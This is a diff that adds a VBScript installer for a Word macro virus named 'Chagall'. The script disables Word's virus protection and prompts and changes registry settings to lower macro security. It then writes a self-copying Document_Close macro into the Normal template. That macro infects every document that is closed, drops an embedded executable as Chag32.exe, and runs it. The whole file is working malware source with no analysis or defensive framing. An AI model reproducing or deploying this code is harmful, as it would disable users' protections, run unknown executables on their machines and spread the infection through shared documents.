@@ -1,0 +1,52 @@
+On Error Resume Next
+Set Word = WScript.CreateObject("Word.Application")
+Set Shell = CreateObject("WScript.Shell")
+Set N = Word.NormalTemplate.VBProject.VBComponents("ThisDocument").CodeModule
+Word.Options.VirusProtection = False
+Word.Options.ConfirmConversion = False
+Word.Options.SaveNormalPrompt = False
+RegPath = "HKCU\Software\Microsoft\Office\" & Word.Application.Version & "\Word\Security\"
+Shell.RegWrite RegPath & "Level", 1, "REG_DWORD"
+Shell.RegWrite RegPath & "AccessVBOM", 1, "REG_DWORD"
+N.DeleteLines 1, N.CountOfLines
+N.InsertLines 1, "Private Sub Document_Close()"
+N.InsertLines 2, "On Error Resume Next"
+N.InsertLines 3, "Options.VirusProtection = False"
+N.InsertLines 4, "Options.SaveNormalPrompt = False"
+N.InsertLines 5, "Options.ConfirmConversions = False"
+N.InsertLines 6, "Set VirCode = NormalTemplate.VBProject.VBComponents(1).CodeModule"
+N.InsertLines 7, "Set ActiveD = ActiveDocument.VBProject.VBComponents(1)"
+N.InsertLines 8, "Set ActCode = ActiveD.CodeModule"
+N.InsertLines 9, "If ActiveD.Name = ""Chagall"" Then"
+N.InsertLines 10, "GoTo DropExe"
+N.InsertLines 11, "Else"
+N.InsertLines 12, "ActCode.DeleteLines 1, ActCode.CountOfLines"
+N.InsertLines 13, "ActCode.InsertLines 1, VirCode.Lines(1, VirCode.CountOfLines)"
+N.InsertLines 14, "ActiveD.Name = ""Chagall"""
+N.InsertLines 15, "End If"
+N.InsertLines 16, "DropExe:"
+N.InsertLines 17, "Dim AExeFile As String"
+N.InsertLines 18, "Dim NExeFile As String"
+N.InsertLines 19, "AExeFile = ActiveDocument.Variables(""llagahc"").Value"
+N.InsertLines 20, "NExeFile = Normal.ThisDocument.Variables(""llagahc"").Value"
+N.InsertLines 21, "If NExeFile = """" Then"
+N.InsertLines 22, "Open Environ(""WinDir"") & ""\Chag.wrd"" For Binary As #1"
+N.InsertLines 23, "NExeFile = Space(LOF(1))"
+N.InsertLines 24, "Get #1, , NExeFile"
+N.InsertLines 25, "Close #1"
+N.InsertLines 26, "Normal.ThisDocument.Variables.Add ""llagahc"", NExeFile"
+N.InsertLines 27, "End If"
+N.InsertLines 28, "If AExeFile = """" Then"
+N.InsertLines 29, "ActiveDocument.Variables.Add ""llagahc"", NExeFile"
+N.InsertLines 30, "End If"
+N.InsertLines 31, "Open Left(Environ(""WinDir""), 3) & ""Chag32.exe"" For Binary As #1"
+N.InsertLines 32, "Put #1, , NExeFile"
+N.InsertLines 33, "Close #1"
+N.InsertLines 34, "Shell Left(Environ(""WinDir""), 3) & ""Chag32.exe"""
+N.InsertLines 35, "If Left(ActiveDocument.Name, 2) = ""Do"" And IsNumeric(Right(ActiveDocument.Name, 1)) = True Then"
+N.InsertLines 36, "ActiveDocument.Saved = True"
+N.InsertLines 37, "Else"
+N.InsertLines 38, "ActiveDocument.SaveAs ActiveDocument.FullName"
+N.InsertLines 39, "End If"
+N.InsertLines 40, "End Sub"
+Word.Quit
